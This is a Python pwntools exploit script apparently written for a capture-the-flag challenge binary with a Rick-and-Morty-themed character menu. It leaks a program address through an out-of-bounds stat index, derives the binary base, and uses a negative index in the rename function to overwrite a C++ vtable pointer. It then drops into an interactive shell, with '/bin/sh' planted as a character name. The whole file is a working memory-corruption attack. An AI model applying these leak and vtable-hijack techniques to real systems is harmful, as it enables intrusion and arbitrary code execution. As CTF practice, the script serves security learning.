#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('public/chall')
# context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['tmux', 'new-window']

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1337)


def local(argv=[], *a, **kw):
    return process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(argv, *a, **kw)
    else:
        if args.PWNDBG:
            gs = '''
            init-pwndbg
            b main
            c
            '''
            return gdb.debug(exe.path, gs)
        elif args.GEF:
            gs = '''
            init-gef
            '''
            return gdb.debug(exe.path, gs)
        else:
            return local(argv, *a, **kw)


def log_addr(name, addr):
    log.info('{}: {:#x}'.format(name, addr))


def create_character(cclass, name):
    sla('> ', cclass)
    sla('> ', name)


def view_stat(stat_idx):
    stats = ["Physical attack", "Magic attack", "Physical defense", "Magic defense",
             "Speed", "Skill 1 cost", "Skill 2 cost", "Skill 3 cost", "Skill 4 cost"]
    sla('> ', '1')
    sla('> ', '2')
    sla('> ', stats[stat_idx])
    ru(': ')
    return rl().strip()


def change_name(new_name):
    sla('> ', '2')
    sla('> ', '1')
    sla('> ', '-1')
    sla('> ', new_name)


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


io = start()


def sl(x): return io.sendline(x)
def sla(x, y): return io.sendlineafter(x, y)
def se(x): return io.send(x)
def sa(x, y): return io.sendafter(x, y)
def ru(x): return io.recvuntil(x)
def rl(): return io.recvline()
def cl(): return io.clean()
def uu64(x): return u64(x.ljust(8, b'\x00'))


leak_off = 0x308d0 + 0x5000
idx = 8
offset = 0x20

create_character("EvilRick", "abc")
create_character("PickleRick", "/bin/sh\0")

leak = view_stat(idx)
log_addr("Leak", int(leak))
exe.address = int(leak) - leak_off
vtb_b = exe.sym._ZTV8RickC137
log_addr("RickC137 vtable", vtb_b)

payload = b''
payload += b'a' * offset
payload += p64(vtb_b + 0x10)[:-1]

change_name(payload)
sla('> ', '3')

io.interactive()
